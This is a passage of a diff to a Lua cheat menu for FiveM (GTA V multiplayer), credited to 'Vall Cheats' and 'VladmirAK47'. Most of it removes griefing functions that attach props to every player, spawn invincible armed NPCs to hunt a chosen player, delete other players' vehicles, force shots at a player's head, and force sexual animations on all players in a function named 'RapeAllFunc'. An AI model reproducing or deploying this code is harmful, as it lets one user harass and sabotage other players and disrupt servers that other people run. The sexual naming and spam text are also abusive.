     },
     {
-        name = '~h~Schafter Purple',
+        name = "~h~Schafter Purple",
         id = 148
     },
     {
-        name = '~h~Red',
+        name = "~h~Red",
         id = 39
     },
     {
-        name = '~h~Dark Red',
+        name = "~h~Dark Red",
         id = 40
     },
     {
-        name = '~h~Orange',
+        name = "~h~Orange",
         id = 41
     },
     {
-        name = '~h~Yellow',
+        name = "~h~Yellow",
         id = 42
     },
     {
-        name = '~h~Lime Green',
+        name = "~h~Lime Green",
         id = 55
     },
     {
-        name = '~h~Green',
+        name = "~h~Green",
         id = 128
     },
     {
-        name = '~h~Forest Green',
+        name = "~h~Forest Green",
         id = 151
     },
     {
-        name = '~h~Foliage Green',
+        name = "~h~Foliage Green",
         id = 155
     },
     {
-        name = '~h~Olive Darb',
+        name = "~h~Olive Darb",
         id = 152
     },
     {
-        name = '~h~Dark Earth',
+        name = "~h~Dark Earth",
         id = 153
     },
     {
-        name = '~h~Desert Tan',
+        name = "~h~Desert Tan",
         id = 154
     }
 }
 local bu = {
     {
-        name = '~h~Brushed Steel',
+        name = "~h~Brushed Steel",
         id = 117
     },
     {
-        name = '~h~Brushed Black Steel',
+        name = "~h~Brushed Black Steel",
         id = 118
     },
     {
-        name = '~h~Brushed Aluminum',
+        name = "~h~Brushed Aluminum",
         id = 119
     },
     {
-        name = '~h~Pure Gold',
+        name = "~h~Pure Gold",
         id = 158
     },
     {
-        name = '~h~Brushed Gold',
+        name = "~h~Brushed Gold",
         id = 159
     }
 }
-
-if GetVehiclePedIsUsing(PlayerPedId()) then
-    veh = GetVehiclePedIsUsing(PlayerPedId())
-end
-local bv = false
-local bw = true
-local bx = GetPlayerServerId(PlayerPedId(-1))
-local by = GetPlayerName(bx)
-av('by Vall Cheats', true)
-local function bz(I, x, y)
-    SetTextFont(0)
-    SetTextProportional(1)
-    SetTextScale(0.0, 0.4)
-    SetTextDropshadow(1, 0, 0, 0, 255)
-    SetTextEdge(1, 0, 0, 0, 255)
-    SetTextDropShadow()
-    SetTextOutline()
-    SetTextEntry('STRING')
-    AddTextComponentString(I)
-    DrawText(x, y)
-end
-
-function RequestModelSync(bA)
-    local bB = GetHashKey(bA)
-    RequestModel(bB)
-    while not HasModelLoaded(bB) do
-        RequestModel(bB)
-        Citizen.Wait(0)
-    end
-end
-
-
-
-
-function bananapartyall()
-    Citizen.CreateThread(
-        function()
-            for i = 0, 128 do
-                local bH = CreateObject(GetHashKey('prop_beach_fire '), 0, 0, 0, true, true, true)
-                local bI = CreateObject(GetHashKey('prop_rock_4_big2'), 0, 0, 0, true, true, true)
-                local bJ = CreateObject(GetHashKey('prop_beachflag_le'), 0, 0, 0, true, true, true)
-                AttachEntityToEntity(
-                    bH,
-                    GetPlayerPed(i),
-                    GetPedBoneIndex(GetPlayerPed(i), 57005),
-                    0.4,
-                    0,
-                    0,
-                    0,
-                    270.0,
-                    60.0,
-                    true,
-                    true,
-                    false,
-                    true,
-                    1,
-                    true
-                )
-                AttachEntityToEntity(
-                    bI,
-                    GetPlayerPed(i),
-                    GetPedBoneIndex(GetPlayerPed(i), 57005),
-                    0.4,
-                    0,
-                    0,
-                    0,
-                    270.0,
-                    60.0,
-                    true,
-                    true,
-                    false,
-                    true,
-                    1,
-                    true
-                )
-                AttachEntityToEntity(
-                    bJ,
-                    GetPlayerPed(i),
-                    GetPedBoneIndex(GetPlayerPed(i), 57005),
-                    0.4,
-                    0,
-                    0,
-                    0,
-                    270.0,
-                    60.0,
-                    true,
-                    true,
-                    false,
-                    true,
-                    1,
-                    true
-                )
-            end
-        end
-    )
-end
-
-function NukeServer1()
-    Citizen.CreateThread(
-        function()
-            for i = 0, 128 do
-                local bH = CreateObject(GetHashKey('stt_prop_stunt_soccer_sball'), 0, 0, 0, true, true, true)
-                local bI = CreateObject(GetHashKey('freight'), 0, 0, 0, true, true, true)
-                local bJ = CreateObject(GetHashKey('stt_prop_race_start_line_03b'), 0, 0, 0, true, true, true)
-                AttachEntityToEntity(
-                    bH,
-                    GetPlayerPed(i),
-                    GetPedBoneIndex(GetPlayerPed(i), 57005),
-                    0.4,
-                    0,
-                    2,
-                    0,
-                    0.0,
-                    0.0,
-                    true,
-                    true,
-                    false,
-                    true,
-                    1,
-                    true
-                )
-                AttachEntityToEntity(
-                    bI,
-                    GetPlayerPed(i),
-                    GetPedBoneIndex(GetPlayerPed(i), 57005),
-                    0.4,
-                    0,
-                    0,
-                    0,
-                    0.0,
-                    0.0,
-                    true,
-                    true,
-                    false,
-                    true,
-                    1,
-                    true
-                )
-                AttachEntityToEntity(
-                    bJ,
-                    GetPlayerPed(i),
-                    GetPedBoneIndex(GetPlayerPed(i), 57005),
-                    0.4,
-                    0,
-                    0,
-                    0,
-                    0.0,
-                    90.0,
-                    true,
-                    true,
-                    false,
-                    true,
-                    1,
-                    true
-                )
-            end
-        end
-    )
-end
-
-
-function cage2()
-    Citizen.CreateThread(
-        function()
-                local bH = CreateObject(GetHashKey('fib_5_mcs_10_lightrig'), 0, 0, 0, true, true, true)
-                local bI = CreateObject(GetHashKey('fib_5_mcs_10_lightrig'), 0, 0, 0, true, true, true)
-                local bJ = CreateObject(GetHashKey('fib_5_mcs_10_lightrig'), 0, 0, 0, true, true, true)
-                AttachEntityToEntity(
-                    bH,
-                    GetPlayerPed(player),
-                    GetPedBoneIndex(GetPlayerPed(player), 57005),
-                    2,
-                    0,
-                    0,
-                    0,
-                    170.0,
-                    60.0,
-                    true,
-                    true,
-                    false,
-                    true,
-                    1,
-                    true
-                )
-                AttachEntityToEntity(
-                    bI,
-                    GetPlayerPed(player),
-                    GetPedBoneIndex(GetPlayerPed(player), 57005),
-                    0.7,
-                    0,
-                    0,
-                    0,
-                    170.0,
-                    60.0,
-                    true,
-                    true,
-                    false,
-                    true,
-                    1,
-                    true
-                )
-                AttachEntityToEntity(
-                    bJ,
-                    GetPlayerPed(player),
-                    GetPedBoneIndex(GetPlayerPed(player), 57005),
-                    0.4,
-                    0,
-                    0,
-                    0,
-                    270.0,
-                    60.0,
-                    true,
-                    true,
-                    false,
-                    true,
-                    1,
-                    true
-                )
-        end
-    )
-end
-    local function runOnAll(func, ...)
-        local players = GetActivePlayers()
-        for i = 1, #players do
-            pcall(func, players[i], ...)
-        end
-    end
-function RespawnPed(ped, bK, bL)
-    SetEntityCoordsNoOffset(ped, bK.x, bK.y, bK.z, false, false, false, true)
-    NetworkResurrectLocalPlayer(bK.x, bK.y, bK.z, bL, true, false)
-    SetPlayerInvincible(ped, false)
-    TriggerEvent('playerSpawned', bK.x, bK.y, bK.z)
-    ClearPedBloodDamage(ped)
-end
-local function bM(ad)
-    --local ped = GetPlayerPed(SelectedPlayer)
-    local bN = NetworkGetNetworkIdFromEntity(SelectedPlayer)
-    local bO = 0
-    NetworkRequestControlOfNetworkId(bN)
-    while not NetworkHasControlOfNetworkId(bN) do
-        Citizen.Wait(1)
-        NetworkRequestControlOfNetworkId(bN)
-        bO = bO + 1
-        if bO == 5000 then
-            Citizen.Trace('Control failed')
-            break
-        end
-    end
-end
-local function bP(bQ, bR)
-    for i = 0, 10 do
-        local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
-        RequestModel(GetHashKey(bQ))
-        Citizen.Wait(50)
-        if HasModelLoaded(GetHashKey(bQ)) then
-            local ped =
-                CreatePed(21, GetHashKey(bQ), bK.x + i, bK.y - i, bK.z, 0, true, false) and
-                CreatePed(21, GetHashKey(bQ), bK.x - i, bK.y + i, bK.z, 0, true, false)
-            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
-                bM(ped)
-                GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
-                SetEntityInvincible(ped, true)
-                SetPedCanSwitchWeapon(ped, true)
-                TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16)
-            elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
-                TaskCombatHatedTargetsInArea(ped, bK.x, bK.y, bK.z, 500)
-            else
-                Citizen.Wait(0)
-            end
-        end
-    end
-end
-
-function RapeAllFunc()
-    --[[for bD = 0, 9 do
-        TriggerServerEvent(
-            '_chat:messageEntered',
-            '^1A^2l^3p^4h^5a^6V^7e^1t^2a',
-            {
-                141,
-                211,
-                255
-            },
-            '^' .. bD .. 'You got raped by VladmirAK47'
-        )
-    end--]]
-    Citizen.CreateThread(
-        function()
-            for i = 0, 128 do
-                RequestModelSync('a_m_o_acult_01')
-                RequestAnimDict('rcmpaparazzo_2')
-                while not HasAnimDictLoaded('rcmpaparazzo_2') do
-                    Citizen.Wait(0)
-                end
-                if IsPedInAnyVehicle(GetPlayerPed(i), true) then
-                    local veh = GetVehiclePedIsIn(GetPlayerPed(i), true)
-                    while not NetworkHasControlOfEntity(veh) do
-                        NetworkRequestControlOfEntity(veh)
-                        Citizen.Wait(0)
-                    end
-                    SetEntityAsMissionEntity(veh, true, true)
-                    DeleteVehicle(veh)
-                    DeleteEntity(veh)
-                end
-                count = -0.2
-                for b = 1, 3 do
-                    local x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(i), true))
-                    local bS = CreatePed(4, GetHashKey('a_m_o_acult_01'), x, y, z, 0.0, true, false)
-                    SetEntityAsMissionEntity(bS, true, true)
-                    AttachEntityToEntity(
-                        bS,
-                        GetPlayerPed(i),
-                        4103,
-                        11816,
-                        count,
-                        0.00,
-                        0.0,
-                        0.0,
-                        0.0,
-                        0.0,
-                        false,
-                        false,
-                        false,
-                        false,
-                        2,
-                        true
-                    )
-                    ClearPedTasks(GetPlayerPed(i))
-                    TaskPlayAnim(GetPlayerPed(i), 'rcmpaparazzo_2', 'shag_loop_poppy', 2.0, 2.5, -1, 49, 0, 0, 0, 0)
-                    SetPedKeepTask(bS)
-                    TaskPlayAnim(bS, 'rcmpaparazzo_2', 'shag_loop_a', 2.0, 2.5, -1, 49, 0, 0, 0, 0)
-                    SetEntityInvincible(bS, true)
-                    count = count - 0.4
-                end
-            end
-        end
-    )
-end
-local function bT()
-    local bU = KeyboardInput('Enter X pos', '', 100)
-    local bV = KeyboardInput('Enter Y pos', '', 100)
-    local bW = KeyboardInput('Enter Z pos', '', 100)
-    if bU ~= '' and bV ~= '' and bW ~= '' then
-        if
-            IsPedInAnyVehicle(GetPlayerPed(-1), 0) and
-                GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1)
-         then
-            entity = GetVehiclePedIsIn(GetPlayerPed(-1), 0)
-        else
-            entity = GetPlayerPed(-1)
-        end
-        if entity then
-            SetEntityCoords(entity, bU + 0.5, bV + 0.5, bW + 0.5, 1, 0, 0, 1)
-            av('Teleported to coords!', false)
-        end
-    else
-        av('~b~Invalid coords!', true)
-    end
-end
-
-local function b_()
-    local ax = GetPlayerPed(-1)
-    local c0 = GetEntityCoords(ax, true)
-    local c1 = GetClosestVehicle(GetEntityCoords(ax, true), 1000.0, 0, 4)
-    local c2 = GetEntityCoords(c1, true)
-    local c3 = GetClosestVehicle(GetEntityCoords(ax, true), 1000.0, 0, 16384)
-    local c4 = GetEntityCoords(c3, true)
-    av('~y~Wait...', false)
-    Citizen.Wait(1000)
-    if c1 == 0 and c3 == 0 then
-        av('~b~No Vehicle Found', true)
-    elseif c1 == 0 and c3 ~= 0 then
-        if IsVehicleSeatFree(c3, -1) then
-            SetPedIntoVehicle(ax, c3, -1)
-            SetVehicleAlarm(c3, false)
-            SetVehicleDoorsLocked(c3, 1)
-            SetVehicleNeedsToBeHotwired(c3, false)
-        else
-            local c5 = GetPedInVehicleSeat(c3, -1)
-            ClearPedTasksImmediately(c5)
-            SetEntityAsMissionEntity(c5, 1, 1)
-            DeleteEntity(c5)
-            SetPedIntoVehicle(ax, c3, -1)
-            SetVehicleAlarm(c3, false)
-            SetVehicleDoorsLocked(c3, 1)
-            SetVehicleNeedsToBeHotwired(c3, false)
-        end
-        av('Teleported Into Nearest Vehicle!', false)
-    elseif c1 ~= 0 and c3 == 0 then
-        if IsVehicleSeatFree(c1, -1) then
-            SetPedIntoVehicle(ax, c1, -1)
-            SetVehicleAlarm(c1, false)
-            SetVehicleDoorsLocked(c1, 1)
-            SetVehicleNeedsToBeHotwired(c1, false)
-        else
-            local c5 = GetPedInVehicleSeat(c1, -1)
-            ClearPedTasksImmediately(c5)
-            SetEntityAsMissionEntity(c5, 1, 1)
-            DeleteEntity(c5)
-            SetPedIntoVehicle(ax, c1, -1)
-            SetVehicleAlarm(c1, false)
-            SetVehicleDoorsLocked(c1, 1)
-            SetVehicleNeedsToBeHotwired(c1, false)
-        end
-        av('Teleported Into Nearest Vehicle!', false)
-    elseif c1 ~= 0 and c3 ~= 0 then
-        if Vdist(c2.x, c2.y, c2.z, c0.x, c0.y, c0.z) < Vdist(c4.x, c4.y, c4.z, c0.x, c0.y, c0.z) then
-            if IsVehicleSeatFree(c1, -1) then
-                SetPedIntoVehicle(ax, c1, -1)
-                SetVehicleAlarm(c1, false)
-                SetVehicleDoorsLocked(c1, 1)
-                SetVehicleNeedsToBeHotwired(c1, false)
-            else
-                local c5 = GetPedInVehicleSeat(c1, -1)
-                ClearPedTasksImmediately(c5)
-                SetEntityAsMissionEntity(c5, 1, 1)
-                DeleteEntity(c5)
-                SetPedIntoVehicle(ax, c1, -1)
-                SetVehicleAlarm(c1, false)
-                SetVehicleDoorsLocked(c1, 1)
-                SetVehicleNeedsToBeHotwired(c1, false)
-            end
-        elseif Vdist(c2.x, c2.y, c2.z, c0.x, c0.y, c0.z) > Vdist(c4.x, c4.y, c4.z, c0.x, c0.y, c0.z) then
-            if IsVehicleSeatFree(c3, -1) then
-                SetPedIntoVehicle(ax, c3, -1)
-                SetVehicleAlarm(c3, false)
-                SetVehicleDoorsLocked(c3, 1)
-                SetVehicleNeedsToBeHotwired(c3, false)
-            else
-                local c5 = GetPedInVehicleSeat(c3, -1)
-                ClearPedTasksImmediately(c5)
-                SetEntityAsMissionEntity(c5, 1, 1)
-                DeleteEntity(c5)
-                SetPedIntoVehicle(ax, c3, -1)
-                SetVehicleAlarm(c3, false)
-                SetVehicleDoorsLocked(c3, 1)
-                SetVehicleNeedsToBeHotwired(c3, false)
-            end
-        end
-        av('Teleported Into Nearest Vehicle!', false)
-    end
-end
-local function c6()
-    if DoesBlipExist(GetFirstBlipInfoId(8)) then
-        local c7 = GetBlipInfoIdIterator(8)
-        local blip = GetFirstBlipInfoId(8, c7)
-        WaypointCoords = Citizen.InvokeNative(0xFA7C7F0AADF25D09, blip, Citizen.ResultAsVector())
-        wp = true
-    else
-        av('~b~No waypoint!', true)
-    end
-    local c8 = 0.0
-    height = 1000.0
-    while wp do
-        Citizen.Wait(0)
-        if wp then
-            if
-                IsPedInAnyVehicle(GetPlayerPed(-1), 0) and
-                    GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1)
-             then
-                entity = GetVehiclePedIsIn(GetPlayerPed(-1), 0)
-            else
-                entity = GetPlayerPed(-1)
-            end
-            SetEntityCoords(entity, WaypointCoords.x, WaypointCoords.y, height)
-            FreezeEntityPosition(entity, true)
-            local c9 = GetEntityCoords(entity, true)
-            if c8 == 0.0 then
-                height = height - 25.0
-                SetEntityCoords(entity, c9.x, c9.y, height)
-                bool, c8 = GetGroundZFor_3dCoord(c9.x, c9.y, c9.z, 0)
-            else
-                SetEntityCoords(entity, c9.x, c9.y, c8)
-                FreezeEntityPosition(entity, false)
-                wp = false
-                height = 1000.0
-                c8 = 0.0
-                av('Teleported to waypoint!', false)
-                break
-            end
-        end
-    end
-end
-local function ca()
-    local cb = KeyboardInput('Enter Vehicle Spawn Name', '', 100)
-    if cb and IsModelValid(cb) and IsModelAVehicle(cb) then
-        RequestModel(cb)
-        while not HasModelLoaded(cb) do
-            Citizen.Wait(0)
-        end
-        local veh =
-            CreateVehicle(
-            GetHashKey(cb),
-            GetEntityCoords(PlayerPedId(-1)),
-            GetEntityHeading(PlayerPedId(-1)),
-            true,
-            true
-        )
-        SetPedIntoVehicle(PlayerPedId(-1), veh, -1)
-    else
-        av('~b~~h~Model is not valid!', true)
-    end
-end
-local function cc()
-    SetVehicleFixed(GetVehiclePedIsIn(GetPlayerPed(-1), false))
-    SetVehicleDirtLevel(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0.0)
-    SetVehicleLights(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
-    SetVehicleBurnout(GetVehiclePedIsIn(GetPlayerPed(-1), false), false)
-    Citizen.InvokeNative(0x1FD09E7390A74D54, GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
-    SetVehicleUndriveable(vehicle, false)
-end
-local function cd()
-    SetVehicleEngineHealth(vehicle, 1000)
-    Citizen.InvokeNative(0x1FD09E7390A74D54, GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
-    SetVehicleUndriveable(vehicle, false)
-end
-local function cd1()
-    SetVehicleEngineHealth(vehicle, 0)
-    Citizen.InvokeNative(0x1FD09E7390A74D54, GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
-    SetVehicleUndriveable(vehicle, true)
-end
-local function ce()
-    VladmirAK47.StartRC()
-end
-VladmirAK47.StartRC = function()
-    if DoesEntityExist(VladmirAK47.Entity) then
-        return
-    end
-    VladmirAK47.SpawnRC()
-    VladmirAK47.Tablet(true)
-    while DoesEntityExist(VladmirAK47.Entity) and DoesEntityExist(VladmirAK47.Driver) do
-        Citizen.Wait(5)
-        local cf = GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()), GetEntityCoords(VladmirAK47.Entity), true)
-        VladmirAK47.DrawInstructions(cf)
-        VladmirAK47.HandleKeys(cf)
-        if cf <= 3000.0 then
-            if not NetworkHasControlOfEntity(VladmirAK47.Driver) then
-                NetworkRequestControlOfEntity(VladmirAK47.Driver)
-            elseif not NetworkHasControlOfEntity(VladmirAK47.Entity) then
-                NetworkRequestControlOfEntity(VladmirAK47.Entity)
-            end
-        else
-            TaskVehicleTempAction(VladmirAK47.Driver, VladmirAK47.Entity, 6, 2500)
-        end
-    end
-end
-VladmirAK47.HandleKeys = function(cf)
-    if IsControlJustReleased(0, 47) then
-        if IsCamRendering(VladmirAK47.Camera) then
-            VladmirAK47.ToggleCamera(false)
-        else
-            VladmirAK47.ToggleCamera(true)
-        end
-    end
-    if cf <= 3.0 then
-        if IsControlJustPressed(0, 38) then
-            VladmirAK47.Attach('pick')
-        end
-    end
-    if cf < 3000.0 then
-        if IsControlPressed(0, 172) and not IsControlPressed(0, 173) then
-            TaskVehicleTempAction(VladmirAK47.Driver, VladmirAK47.Entity, 9, 1)
-        end
-        if IsControlJustReleased(0, 172) or IsControlJustReleased(0, 173) then
-            TaskVehicleTempAction(VladmirAK47.Driver, VladmirAK47.Entity, 6, 2500)
-        end
-        if IsControlPressed(0, 173) and not IsControlPressed(0, 172) then
-            TaskVehicleTempAction(VladmirAK47.Driver, VladmirAK47.Entity, 22, 1)
-        end
-        if IsControlPressed(0, 174) and IsControlPressed(0, 173) then
-            TaskVehicleTempAction(VladmirAK47.Driver, VladmirAK47.Entity, 13, 1)
-        end
-        if IsControlPressed(0, 175) and IsControlPressed(0, 173) then
-            TaskVehicleTempAction(VladmirAK47.Driver, VladmirAK47.Entity, 14, 1)
-        end
-        if IsControlPressed(0, 172) and IsControlPressed(0, 173) then
-            TaskVehicleTempAction(VladmirAK47.Driver, VladmirAK47.Entity, 30, 100)
-        end
-        if IsControlPressed(0, 174) and IsControlPressed(0, 172) then
-            TaskVehicleTempAction(VladmirAK47.Driver, VladmirAK47.Entity, 7, 1)
-        end
-        if IsControlPressed(0, 175) and IsControlPressed(0, 172) then
-            TaskVehicleTempAction(VladmirAK47.Driver, VladmirAK47.Entity, 8, 1)
-        end
-        if IsControlPressed(0, 174) and not IsControlPressed(0, 172) and not IsControlPressed(0, 173) then
-            TaskVehicleTempAction(VladmirAK47.Driver, VladmirAK47.Entity, 4, 1)
-        end
-        if IsControlPressed(0, 175) and not IsControlPressed(0, 172) and not IsControlPressed(0, 173) then
-            TaskVehicleTempAction(VladmirAK47.Driver, VladmirAK47.Entity, 5, 1)
-        end
-        if IsControlJustReleased(0, 168) then
-            SetVehicleEngineOn(VladmirAK47.Entity, not GetIsVehicleEngineRunning(VladmirAK47.Entity), false, true)
-        end
-    end
-end
-VladmirAK47.DrawInstructions = function(cf)
-    local cg = {
-        {
-            ['label'] = 'Right',
-            ['button'] = '~INPUT_CELLPHONE_RIGHT~'
-        },
-        {
-            ['label'] = 'Forward',
-            ['button'] = '~INPUT_CELLPHONE_UP~'
-        },
-        {
-            ['label'] = 'Reverse',
-            ['button'] = '~INPUT_CELLPHONE_DOWN~'
-        },
-        {
-            ['label'] = 'Left',
-            ['button'] = '~INPUT_CELLPHONE_LEFT~'
-        }
-    }
-    local ch = {
-        ['label'] = 'Delete Car',
-        ['button'] = '~INPUT_CONTEXT~'
-    }
-    local cj = {
-        {
-            ['label'] = 'Toggle Camera',
-            ['button'] = '~INPUT_DETONATE~'
-        },
-        {
-            ['label'] = 'Start/Stop Engine',
-            ['button'] = '~INPUT_SELECT_CHARACTER_TREVOR~'
-        }
-    }
-    if cf <= 3000.0 then
-        for ck = 1, #cg do
-            local cl = cg[ck]
-            table.insert(cj, cl)
-        end
-        if cf <= 3000.0 then
-            table.insert(cj, ch)
-        end
-    end
-    Citizen.CreateThread(
-        function()
-            local cm = RequestScaleformMovie('instructional_buttons')
-            while not HasScaleformMovieLoaded(cm) do
-                Wait(0)
-            end
-            PushScaleformMovieFunction(cm, 'CLEAR_ALL')
-            PushScaleformMovieFunction(cm, 'TOGGLE_MOUSE_BUTTONS')
-            PushScaleformMovieFunctionParameterBool(0)
-            PopScaleformMovieFunctionVoid()
-            for ck, cn in ipairs(cj) do
-                PushScaleformMovieFunction(cm, 'SET_DATA_SLOT')
-                PushScaleformMovieFunctionParameterInt(ck - 1)
-                PushScaleformMovieMethodParameterButtonName(cn['button'])
-                PushScaleformMovieFunctionParameterString(cn['label'])
-                PopScaleformMovieFunctionVoid()
-            end
-            PushScaleformMovieFunction(cm, 'DRAW_INSTRUCTIONAL_BUTTONS')
-            PushScaleformMovieFunctionParameterInt(-1)
-            PopScaleformMovieFunctionVoid()
-            DrawScaleformMovieFullscreen(cm, 255, 255, 255, 255)
-        end
-    )
-end
-VladmirAK47.SpawnRC = function()
-    local cb = KeyboardInput('Enter Vehicle Spawn Name', '', 50)
-    if cb and IsModelValid(cb) and IsModelAVehicle(cb) then
-        RequestModel(cb)
-        while not HasModelLoaded(cb) do
-            Citizen.Wait(0)
-        end
-        VladmirAK47.LoadModels(
-            {
-                GetHashKey(cb),
-                68070371
-            }
-        )
-        local co, cp =
-            GetEntityCoords(PlayerPedId()) + GetEntityForwardVector(PlayerPedId()) * 2.0,
-            GetEntityHeading(PlayerPedId())
-        VladmirAK47.Entity = CreateVehicle(GetHashKey(cb), co, cp, true)
-        while not DoesEntityExist(VladmirAK47.Entity) do
-            Citizen.Wait(5)
-        end
-        VladmirAK47.Driver = CreatePed(5, 68070371, co, cp, true)
-        SetEntityInvincible(VladmirAK47.Driver, true)
-        SetEntityVisible(VladmirAK47.Driver, false)
-        FreezeEntityPosition(VladmirAK47.Driver, true)
-        SetPedAlertness(VladmirAK47.Driver, 0.0)
-        TaskWarpPedIntoVehicle(VladmirAK47.Driver, VladmirAK47.Entity, -1)
-        while not IsPedInVehicle(VladmirAK47.Driver, VladmirAK47.Entity) do
-            Citizen.Wait(0)
-        end
-        VladmirAK47.Attach('place')
-        av('~h~Success', false)
-    else
-        av('~b~~h~Model is not valid !', true)
-    end
-end
-VladmirAK47.Attach = function(aw)
-    if not DoesEntityExist(VladmirAK47.Entity) then
-        return
-    end
-    VladmirAK47.LoadModels(
-        {
-            'pickup_object'
-        }
-    )
-    if aw == 'place' then
-        AttachEntityToEntity(
-            VladmirAK47.Entity,
-            PlayerPedId(),
-            GetPedBoneIndex(PlayerPedId(), 28422),
-            3.0,
-            0.0,
-            0.5,
-            70.0,
-            0.0,
-            270.0,
-            1,
-            1,
-            0,
-            0,
-            2,
-            1
-        )
-        Citizen.Wait(200)
-        DetachEntity(VladmirAK47.Entity, false, true)
-        PlaceObjectOnGroundProperly(VladmirAK47.Entity)
-    elseif aw == 'pick' then
-        if DoesCamExist(VladmirAK47.Camera) then
-            VladmirAK47.ToggleCamera(false)
-        end
-        VladmirAK47.Tablet(false)
-        Citizen.Wait(100)
-        DetachEntity(VladmirAK47.Entity)
-        DeleteVehicle(VladmirAK47.Entity)
-        DeleteEntity(VladmirAK47.Driver)
-        VladmirAK47.UnloadModels()
-    end
-end
-VladmirAK47.Tablet = function(cq)
-    if cq then
-        VladmirAK47.LoadModels(
-            {
-                GetHashKey('prop_cs_tablet')
-            }
-        )
-        VladmirAK47.LoadModels(
-            {
-                'amb@code_human_in_bus_passenger_idles@female@tablet@idle_a'
-            }
-        )
-        Citizen.CreateThread(
-            function()
-                while DoesEntityExist(VladmirAK47.TabletEntity) do
-                    Citizen.Wait(5)
-                    if
-                        not IsEntityPlayingAnim(
-                            PlayerPedId(),
-                            'amb@code_human_in_bus_passenger_idles@female@tablet@idle_a',
-                            'idle_a',
-                            3
-                        )
-                     then
-                    end
-                end
-                ClearPedTasks(PlayerPedId())
-            end
-        )
-    else
-        DeleteEntity(VladmirAK47.TabletEntity)
-    end
-end
-VladmirAK47.ToggleCamera = function(cq)
-    if not true then
-        return
-    end
-    if cq then
-        if not DoesEntityExist(VladmirAK47.Entity) then
-            return
-        end
-        if DoesCamExist(VladmirAK47.Camera) then
-            DestroyCam(VladmirAK47.Camera)
-        end
-        VladmirAK47.Camera = CreateCam('DEFAULT_SCRIPTED_CAMERA', true)
-        AttachCamToEntity(VladmirAK47.Camera, VladmirAK47.Entity, 0.0, 0.0, 0.4, true)
-        Citizen.CreateThread(
-            function()
-                while DoesCamExist(VladmirAK47.Camera) do
-                    Citizen.Wait(5)
-                    SetCamRot(VladmirAK47.Camera, GetEntityRotation(VladmirAK47.Entity))
-                end
-            end
-        )
-        local cr =
-            500 *
-            math.ceil(
-                GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()), GetEntityCoords(VladmirAK47.Entity), true) / 10
-            )
-        RenderScriptCams(1, 1, cr, 1, 1)
-        Citizen.Wait(cr)
-        SetTimecycleModifier('scanline_cam_cheap')
-        SetTimecycleModifierStrength(2.0)
-    else
-        local cr =
-            500 *
-            math.ceil(
-                GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()), GetEntityCoords(VladmirAK47.Entity), true) / 10
-            )
-        RenderScriptCams(0, 1, cr, 1, 0)
-        Citizen.Wait(cr)
-        ClearTimecycleModifier()
-        DestroyCam(VladmirAK47.Camera)
-    end
-end
-VladmirAK47.LoadModels = function(cs)
-    for ct = 1, #cs do
-        local bB = cs[ct]
-        if not VladmirAK47.CachedModels then
-            VladmirAK47.CachedModels = {}
-        end
-        table.insert(VladmirAK47.CachedModels, bB)
-        if IsModelValid(bB) then
-            while not HasModelLoaded(bB) do
-                RequestModel(bB)
-                Citizen.Wait(10)
-            end
-        else
-            while not HasAnimDictLoaded(bB) do
-                RequestAnimDict(bB)
-                Citizen.Wait(10)
-            end
-        end
-    end
-end
-VladmirAK47.UnloadModels = function()
-    for ct = 1, #VladmirAK47.CachedModels do
-        local bB = VladmirAK47.CachedModels[ct]
-        if IsModelValid(bB) then
-            SetModelAsNoLongerNeeded(bB)
-        else
-            RemoveAnimDict(bB)
-        end
-    end
-end
-
-
-
-
-local function doText(numLetters)
-    local totTxt = ""
-    for i = 1,numLetters do
-        totTxt = totTxt..string.char(math.random(65,90))
-    end
-    print(totTxt)
-end
-
-
-function daojosdinpatpemata()
-    local ax = GetPlayerPed(-1)
-    local ay = GetVehiclePedIsIn(ax, true)
-    if
-        IsPedInAnyVehicle(GetPlayerPed(-1), 0) and
-            GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1)
-     then
-        SetVehicleOnGroundProperly(ay)
-        av('Vehicle Flipped!', false)
-    else
-        av("~b~You Aren't In The Driverseat Of A Vehicle!", true)
-    end
-end
-
-function stringsplit(cy, cz)
-    if cz == nil then
-        cz = '%s'
-    end
-    local cA = {}
-    i = 1
-    for cB in string.gmatch(cy, '([^' .. cz .. ']+)') do
-        cA[i] = cB
-        i = i + 1
-    end
-    return cA
-end
-local cC = false
-
-function SpectatePlayer(cD)
-    local ax = PlayerPedId(-1)
-    cC = not cC
-    local cE = GetPlayerPed(cD)
-    if cC then
-        local cF, cG, cH = table.unpack(GetEntityCoords(cE, false))
-        RequestCollisionAtCoord(cF, cG, cH)
-        NetworkSetInSpectatorMode(true, cE)
-        av('Spectating ' .. GetPlayerName(cD), false)
-    else
-        local cF, cG, cH = table.unpack(GetEntityCoords(cE, false))
-        RequestCollisionAtCoord(cF, cG, cH)
-        NetworkSetInSpectatorMode(false, cE)
-        av('Stopped Spectating ' .. GetPlayerName(cD), false)
-    end
-end
-
-function ShootPlayer(cD)
-    local head = GetPedBoneCoords(cD, GetEntityBoneIndexByName(cD, 'SKEL_HEAD'), 0.0, 0.0, 0.0)
-    SetPedShootsAtCoord(PlayerPedId(-1), head.x, head.y, head.z, true)
-end
+ 
 
 function MaxOut(veh)
     SetVehicleModKit(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
     SetVehicleWheelType(GetVehiclePedIsIn(GetPlayerPed(-1), false), 7)
-    SetVehicleMod(
-        GetVehiclePedIsIn(GetPlayerPed(-1), false),
-        0,
-        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0) - 1,
-        false
-    )
-    SetVehicleMod(
